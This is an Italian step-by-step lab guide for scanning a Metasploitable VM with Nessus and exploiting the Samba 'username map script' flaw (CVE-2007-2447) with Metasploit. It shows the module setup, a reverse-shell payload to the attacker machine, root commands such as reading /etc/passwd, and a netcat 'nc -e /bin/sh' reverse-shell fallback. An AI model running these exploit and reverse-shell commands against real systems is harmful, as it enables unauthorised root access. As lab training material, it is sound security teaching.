📊 FASE 1: INSTALLAZIONE E CONFIGURAZIONE NESSUS
1.1 Scaricare Nessus
bash

cd ~/Downloads
wget https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.8.2-debian10_amd64.deb

Oppure scaricare manualmente da: https://www.tenable.com/downloads/nessus
1.2 Installare Nessus
bash

sudo dpkg -i Nessus-*.deb
sudo apt --fix-broken install -y

1.3 Avviare il servizio
bash

sudo systemctl start nessusd
sudo systemctl enable nessusd

1.4 Configurare via browser

    Apri: https://localhost:8834

    Seleziona "Nessus Essentials"

    Richiedi il codice di attivazione via email

    Inserisci il codice ricevuto

    Crea account utente (username/password)

    Aspetta il download dei plugin (5-15 minuti)

🔍 FASE 2: SCANSIONE VULNERABILITÀ CON NESSUS
2.1 Creare la scansione

    Dashboard Nessus → "New Scan"

    Seleziona "Basic Network Scan"

    Configura:

        Name: Metasploitable_Scan

        Targets: 192.168.50.150

    Clicca su "Save"

    Clicca su "Launch" (▶)

2.2 Analizzare i risultati

    Attendi il completamento (5-10 minuti)

    Clicca sul nome dello scan

    Vai su "Vulnerabilities"

    Cerca la vulnerabilità:

text

📌 Samba < 3.0.25 - 'username map script' Command Execution
   Severity: CRITICAL (10.0)
   Porta: 445/tcp
   CVE: CVE-2007-2447

2.3 Documentare

    📸 Screenshot del report Nessus che mostra la vulnerabilità

🎯 FASE 3: SFRUTTAMENTO CON METASPLOIT
3.1 Avviare MSFConsole
bash

sudo msfconsole

3.2 Cercare l'exploit
msf

msf6 > search usermap_script

3.3 Selezionare l'exploit
msf

msf6 > use exploit/multi/samba/usermap_script

3.4 Configurare le opzioni
msf

# Target
msf6 > set RHOSTS 192.168.50.150
msf6 > set RPORT 445

# Payload
msf6 > set PAYLOAD cmd/unix/reverse

# Listener (Kali)
msf6 > set LHOST 192.168.50.100
msf6 > set LPORT 5555

3.5 Verificare la configurazione
msf

msf6 > show options

Output atteso:
text

Module options (exploit/multi/samba/usermap_script):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.50.150   yes       The target host(s)
   RPORT    445              yes       The target port (TCP)

Payload options (cmd/unix/reverse):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.50.100   yes       The listen address
   LPORT  5555             yes       The listen port

3.6 Eseguire l'exploit
msf

msf6 > exploit

Output atteso:
text

[*] Started reverse TCP double handler on 192.168.50.100:5555
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 0Z2kXhxjSXb2CwC3;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] Matching...
[*] Sending stage (336 bytes) to 192.168.50.150
[*] Command shell session 1 opened (192.168.50.100:5555 -> 192.168.50.150:xxxxx) at 2026-07-26 10:00:00 +0000

3.7 Documentare

    📸 Screenshot della configurazione di Metasploit (show options)

    📸 Screenshot dell'output dell'exploit (session opened)

💻 FASE 4: VERIFICA DELLA SESSIONE
4.1 Eseguire ifconfig

Nella shell ottenuta, esegui:
bash

ifconfig

4.2 Output atteso
text

eth0      Link encap:Ethernet  HWaddr 00:0c:29:xx:xx:xx  
          inet addr:192.168.50.150  Bcast:192.168.50.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fexx:xxxx/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1234 errors:0 dropped:0 overruns:0 frame:0
          TX packets:567 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:98765 (96.4 KB)  TX bytes:54321 (53.0 KB)

4.3 Verifica IP

✅ L'indirizzo IP deve essere 192.168.50.150
4.4 Comandi opzionali nella shell
bash

whoami           # Dovrebbe essere: root
uname -a         # Informazioni sul sistema
pwd              # Directory corrente: /
ls -la           # Elenco file nella root
cat /etc/passwd  # Contenuto del file passwd

4.5 Uscire dalla shell
bash

exit

4.6 Documentare

    📸 Screenshot dell'output di ifconfig che mostra l'IP 192.168.50.150

🗂️ LISTA DELLA DOCUMENTAZIONE RICHIESTA
#	Documento	Stato
1	Screenshot report Nessus (vulnerabilità Samba)	⬜
2	Screenshot configurazione Metasploit (show options)	⬜
3	Screenshot output exploit (session opened)	⬜
4	Screenshot output ifconfig (IP 192.168.50.150)	⬜
5	Output del comando whoami (root)	⬜
6	Output del comando uname -a	⬜
📝 COMANDI RAPIDI (RIASSUNTO)
Nessus
bash

sudo systemctl start nessusd
# Browser: https://localhost:8834

Metasploit
bash

sudo msfconsole
search usermap_script
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.50.150
set RPORT 445
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.50.100
set LPORT 5555
exploit

Shell
bash

ifconfig
whoami
uname -a
exit

⚠️ TROUBLESHOOTING
Se Nessus non si attiva
bash

# Rimuovi tutto e reinstall
sudo systemctl stop nessusd
sudo dpkg --purge nessus
sudo rm -rf /opt/nessus
sudo reboot
# Poi reinstallare da capo

Se l'exploit non funziona

    Riavvia Metasploitable

    Riavvia il servizio Samba:

bash

# Su Metasploitable (se hai accesso)
sudo /etc/init.d/samba restart

    Riprova l'exploit

Se la shell non si apre

    Prova un payload diverso:

msf

set PAYLOAD cmd/unix/bind_perl

    O usa netcat in un altro terminale:

bash

# Terminale 1 - Listener
nc -lvnp 5555

# Terminale 2 - Metasploit
set PAYLOAD cmd/unix/generic
set CMD "nc -e /bin/sh 192.168.50.100 5555"
exploit